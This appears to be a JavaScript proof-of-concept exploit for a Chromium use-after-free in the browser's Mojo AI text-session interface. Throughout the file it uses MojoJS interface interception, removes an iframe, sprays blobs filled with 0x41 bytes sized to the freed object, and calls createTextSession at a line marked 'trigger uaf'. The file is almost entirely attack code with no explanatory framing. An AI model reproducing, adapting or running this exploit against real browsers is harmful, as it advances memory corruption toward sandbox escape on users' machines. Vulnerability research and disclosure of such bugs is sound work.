const kChildID = 'AAA';
const kRFHSize = 0x15c0;
const kPwnInterfaceName = "pwn";

function createChild(id, src) {
  let iframe = document.createElement('iframe');
  iframe.id = id;
  iframe.src = src;
  document.body.appendChild(iframe);
  return iframe;
}

async function trigger(aiManager) {
  document.body.removeChild(document.getElementById(kChildID));
  await sleep(1000);
  let ab = new ArrayBuffer(kRFHSize);
  let dv = new DataView(ab);

  for (let i = 0; i < ab.byteLength; i++) {
    dv.setUint8(i, 0x41);
  }

  await sprayBlob(ab, 0x100);
  let AITextSession = new blink.mojom.AITextSessionPtr();
  let AITextSession_info = new mojo.InterfacePtrInfo();
  let AITextSession_receiver = mojo.makeRequest(AITextSession_info);
  AITextSession.ptr.bind(AITextSession_info); // trigger uaf

  aiManager.createTextSession(AITextSession_receiver, undefined, undefined, []);
}

async function poc() {
  let interceptor = new MojoInterfaceInterceptor(kPwnInterfaceName, "process");

  interceptor.oninterfacerequest = function (e) {
    interceptor.stop();
    let aiManager = new blink.mojom.AIManagerPtr(e.handle);
    trigger(aiManager);
  };

  interceptor.start();
  createChild(kChildID, 'child.html');
}

async function child() {
  let pipe = Mojo.createMessagePipe();
  Mojo.bindInterface(blink.mojom.AIManager.name, pipe.handle1);
  Mojo.bindInterface(kPwnInterfaceName, pipe.handle0, "process");
}